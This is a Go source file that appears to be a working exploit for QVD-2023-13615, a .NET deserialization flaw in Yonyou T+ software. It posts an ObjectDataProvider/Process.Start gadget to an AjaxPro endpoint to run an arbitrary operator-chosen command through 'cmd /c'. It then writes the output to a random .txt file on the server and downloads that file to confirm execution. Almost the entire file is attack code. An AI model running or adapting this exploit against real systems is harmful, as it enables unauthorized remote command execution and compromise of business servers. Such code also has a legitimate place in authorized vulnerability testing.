package main

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"regexp"
)

func generateRandomString(length int) (string, error) {
	bytes := make([]byte, length)
	_, err := rand.Read(bytes)
	if err != nil {
		return "", err
	}
	return base64.URLEncoding.EncodeToString(bytes)[:length] + ".txt", nil
}

func QVD_2023_13615(url string, cmd string) {
	requestBody := fmt.Sprintf(`{"storeID":{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","StartInfo": {"__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","FileName":"cmd","Arguments":"/c %s"}}}}`, cmd)
	// 创建自定义的Transport
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	// 创建自定义的HttpClient
	client := &http.Client{Transport: tr}
	match := regexp.MustCompile(`(\S+\.txt)$`).FindStringSubmatch(cmd)
	if len(match) < 2 {
		fmt.Println("Error")
		return
	}
	filename := match[1]
	req, err := http.NewRequest("POST", url+"/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore", nil)
	if err != nil {
		fmt.Println(err)
		return
	}

	req.Header.Set("X-Ajaxpro-Method", "GetStoreWarehouseByStore")
	req.Body = io.NopCloser(bytes.NewBuffer([]byte(requestBody)))

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		return
	}

	reqCmd, err := http.NewRequest("GET", fmt.Sprintf(url+"/tplus/%s", filename), nil)
	if err != nil {
		fmt.Println(err)
		return
	}
	respCmd, err := client.Do(reqCmd)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer respCmd.Body.Close()
	bodycmd, err := io.ReadAll(respCmd.Body)
	if err != nil {
		fmt.Println(err)
		return
	}
	regCmd := regexp.MustCompile("出错页")
	magCmd := regCmd.MatchString(string(bodycmd))

	// 获取结果
	reg := regexp.MustCompile("\"error\":..([^\\\"]+)")
	mag := reg.MatchString(string(body))

	if !magCmd && resp.StatusCode == 200 && mag && respCmd.StatusCode == 200 {
		log.Println("[+] 存在 QVD-2023-13615 漏洞")
		log.Println("[+] 命令执行结果为：", string(bodycmd))
	} else if magCmd && resp.StatusCode == 200 && mag {
		log.Println("[-] 漏洞存在但无回显")
	} else if (resp.StatusCode != 200 && !mag) || (resp.StatusCode == 200 && !mag) {
		//log.Println(resp.StatusCode, mag)
		log.Println("[-] 不存在 QVD-2023-13615 漏洞")
	} else {
		log.Println("Error: Unknown error")
	}

}

func main() {
	randomString, err := generateRandomString(10)
	if err != nil {
		log.Println("Generating random file error:", err)
		return
	}

	url := flag.String("url", "http://127.0.0.1", "Tatget")
	cmd := flag.String("cmd", "whoami", "command")
	flag.Parse()
	QVD_2023_13615(*url, fmt.Sprintf("%s > %s", *cmd, randomString))
}
